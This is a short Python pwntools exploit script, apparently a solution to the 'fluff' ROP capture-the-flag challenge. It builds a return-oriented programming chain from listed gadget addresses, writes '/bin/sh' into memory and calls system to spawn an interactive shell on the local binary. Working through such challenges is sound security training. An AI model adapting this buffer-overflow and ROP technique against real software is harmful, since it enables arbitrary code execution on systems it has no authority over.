from pwn import *
context.log_level = 'debug'
sh = process("./fluff")
# sh = gdb.debug("./fluff")
elf = ELF("./fluff")

deadbeef = b'b' * 8

mov_r10_r11 = 0x40084e # mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
xchg_r11_r10 = 0x400840 # xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
xor_r11_r11 = 0x400822 # xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
xor_r11_r12 = 0x40082f # xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret

pop_r12 = 0x400832 # pop r12 ; mov r13d, 0x604060 ; ret
pop_rdi = 0x4008c3 # pop rdi ; ret
ret = 0x4005b9 # ret

data_addr = 0x601050
system = elf.plt['system']

mov_r11_r12 = p64(xor_r11_r11) + deadbeef + p64(xor_r11_r12) + deadbeef

binsh = "/bin/sh\x00"


payload = cyclic(0x28)
# payload += p64(0x40080B)
payload += p64(pop_r12) + p64(data_addr) + mov_r11_r12 + p64(xchg_r11_r10) + deadbeef # r10 data_addr
payload += p64(pop_r12) + binsh.encode("utf-8") + mov_r11_r12 # r11 = binsh
payload += p64(mov_r10_r11) + deadbeef + p64(0) # mov [r10] r11 
payload += p64(pop_rdi) + p64(data_addr) + p64(system)

sh.recv()
sh.sendline(payload)
sh.interactive()
